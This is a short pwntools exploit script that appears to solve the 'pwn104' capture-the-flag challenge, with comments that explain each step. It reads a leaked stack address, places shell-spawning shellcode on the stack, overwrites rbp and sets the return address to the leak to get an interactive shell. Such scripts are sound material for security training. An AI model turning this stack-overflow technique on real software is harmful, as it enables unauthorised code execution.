from pwn import *

context.binary = binary = ELF("./pwn104.pwn104")

p = process()
#p = remote("IP", port)
#context.log_level = "debug"

#so this binary leaks the rsp.
#so we will overwrite stack with shellcode inserted.  Stack is fifty bytes.
#then overwrite the rbp.
#then overwrite the retaddr with the leaked pointer to the top of the stack; so execution returns to the stack.  However; we can write anywhere in the stack; even past the return address.

#payload = A(50 bytes stack overwrite) + 8(bytes rbp overwrite) + 8(bytes retaddr overwrite)

#payload A: (50 bytes stack overwrite) = shellcode + (50bytes - shellcode length)

#payload B: 8 bytes of B or b'B'*8

#payload C = 8 bytes of leaked addr = lkaddr = int(output.split(b"at")[1].strip().decode("utf-8"), 16)
#so this splits the output in half around the "at"
#the first part of the output array [0] is all the preamble text
#the second part noted as [1] is the leaked address
#the strip removes all the white space
#the decode converts from bytes to string
#the 16 parses it as a hex number
p.recvuntil(b'at ')
address = p.recvline()
lkaddr = p64(int(address, 16))

print(lkaddr)



shell = asm(shellcraft.sh())
shell = shell.ljust(0x50, b"A")

print(shell)

payload = shell + b'B'*8 + lkaddr

print(payload)

p.sendline(payload)
p.interactive()



